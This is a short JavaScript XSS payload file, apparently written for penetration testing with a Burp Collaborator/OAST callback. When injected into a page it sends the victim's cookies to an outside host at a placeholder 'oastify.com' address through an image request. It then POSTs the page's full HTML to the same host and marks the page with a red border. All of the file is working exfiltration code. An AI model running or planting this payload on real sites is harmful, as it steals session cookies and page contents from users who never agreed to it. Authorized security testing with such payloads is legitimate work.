// payload.js
(function(){
  // Log that we executed
  console.log("🔥 XSS payload.js executed");

  // Send cookies to your Burp Collaborator or OAST server
  new Image().src = "https://yourid.oastify.com/?cookie=" + encodeURIComponent(document.cookie);

  // Send full DOM
  fetch("https://yourid.oastify.com/dom", {
    method: "POST",
    body: document.documentElement.outerHTML
  });

  // Optional: Add persistent visual signal
  document.body.style.border = "5px solid red";
})();
